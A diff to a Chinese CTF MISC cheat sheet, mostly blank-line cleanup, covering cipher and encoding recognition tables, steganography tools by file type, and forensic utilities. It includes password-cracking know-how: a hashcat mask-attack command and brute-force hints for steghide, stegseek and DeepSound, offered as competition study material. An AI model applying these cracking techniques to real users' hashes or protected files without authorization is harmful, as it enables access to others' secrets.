@@ -19,9 +19,6 @@ tags: ['CTF', 'MISC', '知识总结']
 | <font style="color:rgb(51, 51, 51);">foremost</font> | <font style="color:rgb(51, 51, 51);">文件分离</font> | <font style="color:rgb(51, 51, 51);">foremost 参数 输入文件foremost -i inputfile -T</font> | <font style="color:rgb(51, 51, 51);">-t 指定文件类型</font><br/><font style="color:rgb(51, 51, 51);">-i 指定输入文件路径</font><br/><font style="color:rgb(51, 51, 51);">-a 写入所有文件头部</font><br/><font style="color:rgb(51, 51, 51);">-o 指定输出目录</font><br/><font style="color:rgb(51, 51, 51);">-T 输出为当前时间名目录</font> |
 | <font style="color:rgb(51, 51, 51);">strings</font> | <font style="color:rgb(51, 51, 51);">strings</font> | <font style="color:rgb(51, 51, 51);">strings 参数 输入文件strings inputfile</font> | <font style="color:rgb(51, 51, 51);">-a 扫描整个文件</font><br/><font style="color:rgb(51, 51, 51);">-d 打印已初始化数据</font><br/><font style="color:rgb(51, 51, 51);">-e（s,S,b，B，L）s 7bit S 8bit b,l 16bit B,L32bit 进行encoding进行编码</font><br/><font style="color:rgb(51, 51, 51);">-f显示字符前显示文件名 </font><br/><font style="color:rgb(51, 51, 51);">-t 字符串偏移位置-T 指定二进制格式 </font><br/><font style="color:rgb(51, 51, 51);">-v 显示版本信息</font><br/><font style="color:rgb(51, 51, 51);">-w默认情况下 显示空白字符</font> |
 
-
-
-
 ---
 
 # <font style="color:rgb(51, 51, 51);">常见题型</font>
@@ -44,7 +41,6 @@ tags: ['CTF', 'MISC', '知识总结']
 | <font style="color:rgb(51, 51, 51);">logic</font> | <font style="color:rgb(51, 51, 51);">逻辑分析器</font> | | |
 | <font style="color:rgb(51, 51, 51);">iconv</font> | <font style="color:rgb(51, 51, 51);">字符集转换</font> | <font style="color:rgb(51, 51, 51);">iconv -t 编码方式 密文iconv -f utf-8 -t type-7 text</font> | <font style="color:rgb(51, 51, 51);">将编码由-f 编码转为 -t 编码</font> |
 | <font style="color:rgb(51, 51, 51);">010editor</font> | <font style="color:rgb(51, 51, 51);">字符集转换</font> | | |
-
 
 ### john/hashcat 工具参数
 ```plain
@@ -88,7 +84,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">type7</font> | <font style="color:rgb(51, 51, 51);">000C160A0854</font> | <font style="color:rgb(51, 51, 51);">类似16进制，数字，字母组成，需要纯数字种子值</font> |
 | <font style="color:rgb(51, 51, 51);">base16</font> | <font style="color:rgb(51, 51, 51);">68656C6C6F776F7264</font> | <font style="color:rgb(51, 51, 51);">数字，大写字母组成</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（类似base 注：可换表）</font>
 <font style="color:rgb(51, 51, 51);">| 密码编码类型（类似base64）</font>
 
@@ -117,7 +112,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">TripleDES（可更改模式，并非固定U2FsdGVk开头）</font> | <font style="color:rgb(51, 51, 51);">U2FsdGVkX1/e6VmpU+bKS3AY=</font> | <font style="color:rgb(51, 51, 51);">类似base64，需要key，可位移，开通头为U2FsdGVkX1/</font> |
 | <font style="color:rgb(51, 51, 51);">bsae64隐写</font> | <font style="color:rgb(51, 51, 51);">bsd3==ad4g==</font> | <font style="color:rgb(51, 51, 51);">多行base64组合而成</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（类似url编码）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（类似url编码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | :--- | :--- | :--- |
@@ -138,7 +132,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">\U0056\U0041\U0021</font> | <font style="color:rgb(51, 51, 51);">\U数字\U数字\U数字</font> |
 | | <font style="color:rgb(51, 51, 51);">\U+0056\U+0021\U+0041</font> | <font style="color:rgb(51, 51, 51);">\U+数字\U+数字\U+数字</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（整串数字）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（整串数字）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | :--- | :--- | :--- |
@@ -153,7 +146,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">超长整数（libnum.n2s）</font> | <font style="color:rgb(51, 51, 51);">12334344545453453451</font> | <font style="color:rgb(51, 51, 51);">长度很长的整数</font> |
 | <font style="color:rgb(51, 51, 51);">超长整数（long to bytes）</font> | <font style="color:rgb(51, 51, 51);">12334344545453453451</font> | <font style="color:rgb(51, 51, 51);">长度很长的整数</font> |
 | <font style="color:rgb(51, 51, 51);">tupper绘图函数</font> | <font style="color:rgb(51, 51, 51);">12336643543545786362698759</font> | <font style="color:rgb(51, 51, 51);">超级长的整数</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（多串数字）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（多串数字）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
@@ -187,7 +179,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">中文四角号码</font> | <font style="color:rgb(51, 51, 51);">2729 47447</font> | <font style="color:rgb(51, 51, 51);">多串数字组成，单个片段长度为5</font> |
 | <font style="color:rgb(51, 51, 51);">Gronsfled</font> | <font style="color:rgb(51, 51, 51);">ISDASDASDSA11 12 32 43</font> | <font style="color:rgb(51, 51, 51);">密文为英文，密码为多串数字from pycipher import Gronsfeldprint(Gronsfeld([1,50,61,8,9,20,63,41]).decipher("TGLBOMSJNSRAJAZDEZXGHSJNZWHG"))# SICTFSHUMUISAGOODBOYYYYYYYYY</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（整串英文）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（整串英文）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | :--- | :--- | :--- |
@@ -201,7 +192,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">porta密码</font> | <font style="color:rgb(51, 51, 51);">ztxubepz</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要key（矩阵类似维吉尼亚密码表）</font> |
 | <font style="color:rgb(51, 51, 51);">双密码</font> | <font style="color:rgb(51, 51, 51);">HBDSADXCX</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要长度为25的字母表key，以及一个整数key</font> |
 | <font style="color:rgb(51, 51, 51);">列位移密码</font> | <font style="color:rgb(51, 51, 51);">llefolagh</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，以回路排列，可填充大量字符，需要key</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（多串英文）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（多串英文）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
@@ -220,7 +210,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">仓吉输入法</font> | <font style="color:rgb(51, 51, 51);">SIUD DSXX CAXX</font> | <font style="color:rgb(51, 51, 51);">多串英文组成</font> |
 | <font style="color:rgb(51, 51, 51);">郑码</font> | <font style="color:rgb(51, 51, 51);">CXEF FXVV SAAAS</font> | <font style="color:rgb(51, 51, 51);">多串英文组成</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（位移密码）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（位移密码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | :--- | :--- | :--- |
@@ -235,14 +224,12 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">普莱菲尔密码</font> | <font style="color:rgb(51, 51, 51);">LUNBAKSS</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要key</font> |
 | <font style="color:rgb(51, 51, 51);">porta密码</font> | <font style="color:rgb(51, 51, 51);">ztxubepz</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要key（矩阵类似维吉尼亚密码表）</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（回路密码）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（回路密码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | :--- | :--- | :--- |
 | <font style="color:rgb(51, 51, 51);">栅栏密码</font> | <font style="color:rgb(51, 51, 51);">fa{elwr}lghlood</font> | <font style="color:rgb(51, 51, 51);">以W回路排列，可填充大量字符</font> |
 | <font style="color:rgb(51, 51, 51);">曲路密码</font> | <font style="color:rgb(51, 51, 51);">}ey@r{gag10_f</font> | <font style="color:rgb(51, 51, 51);">以回路排列，可填充大量字符</font> |
 | <font style="color:rgb(51, 51, 51);">列位移密码</font> | <font style="color:rgb(51, 51, 51);">llefolagh</font> | <font style="color:rgb(51, 51, 51);">以回路排列，可填充大量字符，需要key</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（乱码）</font>
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（乱码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
@@ -256,8 +243,7 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">base91</font> | <font style="color:rgb(51, 51, 51);">TPwJh>A</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
 | <font style="color:rgb(51, 51, 51);">base92</font> | <font style="color:rgb(51, 51, 51);">FckKnsM*k</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
 | <font style="color:rgb(51, 51, 51);">base2048</font> | <font style="color:rgb(51, 51, 51);">FckKnsM*k</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
-| <font style="color:rgb(51, 51, 51);">RRencode</font> | <font style="color:rgb(51, 51, 51);">(|$$&&@@_=</font><!-- 这是一张图片，ocr 内容为： -->
-![](https://www.yuque.com/api/services/graph/generate_redirect/latex?%40)<font style="color:rgb(51, 51, 51);">%3B#card=math&code=%40%29%3B&id=cavV1)><</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
+| <font style="color:rgb(51, 51, 51);">RRencode</font> | <font style="color:rgb(51, 51, 51);">(|$$&&@@_=</font>![](https://www.yuque.com/api/services/graph/generate_redirect/latex?%40)<font style="color:rgb(51, 51, 51);">%3B#card=math&code=%40%29%3B&id=cavV1)><</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
 | <font style="color:rgb(51, 51, 51);">文本异或</font> | <font style="color:rgb(51, 51, 51);">ddf9</font>_<font style="color:rgb(51, 51, 51);">(_F</font>_<font style="color:rgb(51, 51, 51);">ADF)as</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
 | <font style="color:rgb(51, 51, 51);">WingDings</font> | <font style="color:rgb(51, 51, 51);">ddf9</font>_<font style="color:rgb(51, 51, 51);">(_F</font>_<font style="color:rgb(51, 51, 51);">ADF)as</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
 | <font style="color:rgb(51, 51, 51);">UUencode</font> | <font style="color:rgb(51, 51, 51);">%:&5L;&`</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
@@ -272,7 +258,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">brainfuck</font><br/><font style="color:rgb(51, 51, 51);">（bftools run 进行解密）</font> | <font style="color:rgb(51, 51, 51);"><>}}<>++><</font> | <font style="color:rgb(51, 51, 51);">+-<>[] 组成 </font><font style="color:rgb(51, 51, 51);background-color:#F5D480;">头部有 15 个 .+</font> |
 | <font style="color:rgb(51, 51, 51);">jsfuck</font> | <font style="color:rgb(51, 51, 51);">[]{}!+</font> | <font style="color:rgb(51, 51, 51);">+![]{} 组成 </font> |
 | <font style="color:rgb(51, 51, 51);">jother</font> | <font style="color:rgb(51, 51, 51);">[]+![]{}()</font> | <font style="color:rgb(51, 51, 51);">+![]{}() 组成</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">密码编码类型（杂类）</font>
 #### 杂类-中文
@@ -290,7 +275,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">笔画隐写（当铺密码）</font> | <font style="color:rgb(51, 51, 51);">人王二一</font> | <font style="color:rgb(51, 51, 51);">按照突出的笔尖算数量</font> |
 | <font style="color:rgb(51, 51, 51);">文言文代码</font> | <font style="color:rgb(51, 51, 51);">曰：然者</font> | <font style="color:rgb(51, 51, 51);">文言IDE</font> |
 
-
 #### 杂类-其它
 | **<font style="color:rgb(51, 51, 51);">密码编码类型（杂类）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | :--- | :--- | :--- |
@@ -307,7 +291,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">boke code</font> | <font style="color:rgb(51, 51, 51);">⣿ ⠼ ⠸</font> | <font style="color:rgb(51, 51, 51);">盲文</font> |
 | <font style="color:rgb(51, 51, 51);">spam垃圾邮件隐写</font> | <font style="color:rgb(51, 51, 51);">i tell you 70 present sall</font> | <font style="color:rgb(51, 51, 51);">垃圾邮件spammimic.com</font> |
 
-
 | **<font style="color:rgb(51, 51, 51);">纯文本隐写类型</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | --- | :--- | --- |
 | <font style="color:rgb(51, 51, 51);">零宽隐写（可隐写文件）</font> | <font style="color:rgb(51, 51, 51);">â€Œâ€ªâ€ª</font> | <font style="color:rgb(51, 51, 51);">文本长度过长不匹配 16进制下显示â€Œâ€ªâ€ª</font> |
@@ -317,16 +300,12 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">cloakify</font> | <font style="color:rgb(51, 51, 51);">hello nice too meet</font> | 很多英文单词 |
 | twitter secret message | <font style="color:rgb(51, 51, 51);">hello nice too meet</font> | 很多大小不一样的字符 |
 
-
 | **<font style="color:rgb(51, 51, 51);">特殊编码类型</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
 | :--- | :--- | :--- |
 | <font style="color:rgb(51, 51, 51);">gunplot</font> | <font style="color:rgb(51, 51, 51);">(0,1,1),(0,1,1),(0,2,2),(0,2,1)</font> | <font style="color:rgb(51, 51, 51);">平面坐标系，空间坐标系</font> |
 | <font style="color:rgb(51, 51, 51);">GPS Visualizer</font> | <font style="color:rgb(51, 51, 51);">116.117529w, 39.957202e</font> | <font style="color:rgb(51, 51, 51);">GPS坐标</font> |
 | <font style="color:rgb(51, 51, 51);">Gcode，G语言</font> | <font style="color:rgb(51, 51, 51);">G90 G21 XY7 F100 M2</font> | <font style="color:rgb(51, 51, 51);">Gcode编程语言</font> |
 | <font style="color:rgb(51, 51, 51);">UT Dallas</font> | <font style="color:rgb(51, 51, 51);">FD CS PU HT SU RT LT</font> | <font style="color:rgb(51, 51, 51);">logo绘图</font> |
-
-
-
 
 ---
 
@@ -336,9 +315,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">VareCrypt</font> | <font style="color:rgb(51, 51, 51);">加解密工具</font> |
 | <font style="color:rgb(51, 51, 51);">TrueCrypt</font> | <font style="color:rgb(51, 51, 51);">加解密工具</font> |
 | <font style="color:rgb(51, 51, 51);">PasswareKitForensic</font> | <font style="color:rgb(51, 51, 51);">爆破密码</font> |
-
-
-
 
 ---
 
@@ -369,7 +345,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">gaps-master</font> | <font style="color:rgb(51, 51, 51);">拼图</font> | <font style="color:rgb(51, 51, 51);">gaps run ./flag.png newfalg.png --generations=48 --population=20 --size=100</font> | <font style="color:rgb(51, 51, 51);">gaps run 运行拼图./图片路径--generations=--poplation=--size=图片宽度</font> |
 | <font style="color:rgb(51, 51, 51);">PhotoShop</font> | <font style="color:rgb(51, 51, 51);">编辑图片</font> | | |
 
-
 ### <font style="color:rgb(51, 51, 51);">图片隐写工具</font>
 | **<font style="color:rgb(51, 51, 51);">工具 / 命令名称（隐写工具）</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
 | --- | --- | --- |
@@ -390,7 +365,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">wbStego4.3open</font> | | |
 | <font style="color:rgb(51, 51, 51);">S-Tools</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">拖入输入文件-->拖入隐藏文件于隐写文件上方-->hide</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">拖入图片-->邮件隐写文件窗口-->reveal</font> | |
 
-
 ### <font style="color:rgb(51, 51, 51);">图片隐写特征</font>
 | **<font style="color:rgb(51, 51, 51);">隐写特征</font>** | |
 | :--- | --- |
@@ -400,7 +374,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">末尾ž—º* l<9l0kl10n88j:8<....</font> |
 | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">看起来有点lsb隐写的样子，但不是</font> |
 | <font style="color:rgb(51, 51, 51);">Free File Camouflage</font> | <font style="color:rgb(51, 51, 51);">文件末尾有一段base64编码</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">图片类型：JPG</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码</font>** |
@@ -421,7 +394,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">SilentEye</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">Steghide（如果密码被识别成参数，打双引号！）</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">图片类型：PNG</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
@@ -444,7 +416,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">wbStego4.3open</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);"></font> | <font style="color:rgb(51, 51, 51);"></font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">图片类型：APNG</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
 | :--- | :--- | :--- |
@@ -452,7 +423,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">Pixeljihad</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">图片类型：BMP</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
@@ -469,14 +439,12 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">wbStego4.3open</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">图片类型：BPG</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
 | :--- | :--- | :--- |
 | <font style="color:rgb(51, 51, 51);">bpg</font> | <font style="color:rgb(51, 51, 51);">BPGview</font> | <font style="color:rgb(51, 51, 51);">BPG查看</font> |
 | | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">图片类型：TIFF</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
@@ -485,7 +453,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">SilentEye</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">Steghide</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">图片类型：GIF</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
@@ -498,16 +465,12 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">S-Tools</font> | <font style="color:rgb(51, 51, 51);">有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">图片类型：其它</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
 | :--- | --- | :--- |
 | <font style="color:rgb(51, 51, 51);">WEBP</font> | <font style="color:rgb(51, 51, 51);">浏览器打开</font> | <font style="color:rgb(51, 51, 51);"></font> |
 | | stegpy | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | <font style="color:rgb(51, 51, 51);">PNM</font> | <font style="color:rgb(51, 51, 51);">outguess</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
-
-
-
 
 ---
 
@@ -527,7 +490,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">工具 / 命令名称（隐写工具）</font> | <font style="color:rgb(51, 51, 51);">用途</font> | <font style="color:rgb(51, 51, 51);">命令 / 示例</font> |
 | <font style="color:rgb(51, 51, 51);">010Editor</font> | | |
 
-
 ### <font style="color:rgb(51, 51, 51);">音频隐写工具</font>
 | **<font style="color:rgb(51, 51, 51);">工具 / 命令名称（隐写工具）</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
 | :--- | :--- | :--- |
@@ -535,7 +497,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | <font style="color:rgb(51, 51, 51);">DeepSound</font> | <font style="color:rgb(51, 51, 51);">爆破：</font><br/><font style="color:rgb(51, 51, 51);">python DeepsoundHash.py</font> | |
 | <font style="color:rgb(51, 51, 51);">MP3Stego</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">encode.exe -E 隐藏文件 -P 密码 输入文件</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">Decode.exe -X 输入文件 -P密码</font> | <font style="color:rgb(51, 51, 51);">-E 隐写文件-X 解密文件-P 密码</font> |
 | <font style="color:rgb(51, 51, 51);">steghide</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">steghide embed -cf 输入文件 -ef 隐藏文件 -p 密码</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">steghide extract -sf 输入文件 -p </font><br/><font style="color:rgb(51, 51, 51);">密码爆破：python steghide</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">爆破脚本</font><br/><font style="color:rgb(51, 51, 51);">stegseek 隐写图片 爆破字典</font> | <font style="color:rgb(51, 51, 51);">-cf 输入文件-sf 输入文件-p 密码</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">音频类：MP3</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型 / 有无密码）</font>** |
@@ -545,7 +506,6 @@ hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1
 | | <font style="color:rgb(51, 51, 51);">MP3Stego</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | <font style="color:rgb(77, 77, 77);">private位隐写</font> | | |
-
 
 ### MP3Private位隐写脚本
 ```python
@@ -593,13 +553,11 @@ img.show()
 | | <font style="color:rgb(51, 51, 51);">Steghide</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 | | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
 
-
 ### <font style="color:rgb(51, 51, 51);">音频类型：AVI</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型 / 有无密码）</font>** |
 | :--- | :--- | :--- |
 | <font style="color:rgb(51, 51, 51);">AVI</font> | <font style="color:rgb(51, 51, 51);">DeEggerEmbedder</font> | <font style="color:rgb(51, 51, 51);">无密码</font> |
 | | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
-
 
 ### <font style="color:rgb(51, 51, 51);">音频类型：其它</font>
 | **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型 / 有无密码）</font>** |
@@ -607,9 +565,6 @@ img.show()
 | <font style="color:rgb(51, 51, 51);">AU</font> | <font style="color:rgb(51, 51, 51);">steghide</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
